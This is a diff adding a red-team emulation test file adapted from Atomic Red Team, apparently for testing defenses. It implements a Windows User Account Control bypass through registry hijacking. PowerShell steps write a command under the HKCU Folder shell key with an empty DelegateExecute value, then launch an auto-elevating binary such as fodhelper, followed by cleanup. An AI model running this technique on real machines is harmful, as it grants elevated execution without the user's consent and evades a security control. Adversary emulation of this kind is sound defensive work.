@@ -1,0 +1,68 @@
+# Adapted from Atomic Red Team - Abuse Elevation Control Mechanism: Bypass User Account Control
+# Source: https://www.atomicredteam.io/atomic-red-team/atomics/T1548.002
+# Original auto_generated_guids: 5073adf8-9a50-4bd9-b298-a9bd2ead8af9, 58f641ea-12e3-499a-b684-44dee46bd182, 3c51abf2-44bf-42d8-9111-dc96ff66750f, 3be891eb-4608-4173-87e8-78b494c029b7
+
+---
+api_version: 2.0
+uuid: 88eeab98-ece3-4139-ae0e-b83424a9f1c6
+name: Bypass UAC via Registry Hijacking
+authors:
+  - isaac_fletcher
+  - Atomic Red Team
+description: |
+  Bypass User Account Control using registry hijacking techniques. These methods exploit Windows auto-elevation
+  by hijacking registry classes (mscfile, ms-settings, Folder) to execute commands with elevated privileges
+  without triggering UAC prompts. These techniques leverage trusted Windows executables like eventvwr.exe,
+  fodhelper.exe, ComputerDefaults.exe, and sdclt.exe.
+
+mitre:
+  tactics:
+    - TA0004 Privilege Escalation
+    - TA0005 Defense Evasion
+  techniques:
+    - T1548 Abuse Elevation Control Mechanism
+  subtechniques:
+    - T1548.002 Bypass User Account Control
+
+requirements:
+  platforms:
+    - os: windows
+  superuser: false
+
+args:
+  - name: executable_binary
+    description: Binary to execute with UAC Bypass
+    type: string
+    choices:
+    - fodhelper
+    - computerdefaults
+    - sdclt
+    - eventvwr
+    default: fodhelper
+  - name: command_to_execute
+    description: Command to execute for sdclt method
+    type: string
+    default: cmd.exe /c notepad.exe
+  - name: backup_file_path
+    description: File path to backup UAC settings
+    type: path
+    default: C:\Users\Public\backup.reg
+
+steps:
+  - name: backup_uac_settings
+    executor: powershell
+    inline: |
+      reg export HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System "{{.Args.backup_file_path}}"
+
+  - name: bypass_uac
+    executor: powershell
+    inline: |
+      New-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Value '{{.Args.command_to_execute}}'
+      New-ItemProperty -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute"
+      Start-Process {{.Args.executable_binary}}
+    cleanup:
+      executor: powershell
+      inline: |
+        Stop-Process -Name {{.Args.executable_binary}} -ErrorAction SilentlyContinue
+        reg import "{{.Args.backup_file_path}}"
+        del "{{.Args.backup_file_path}}"
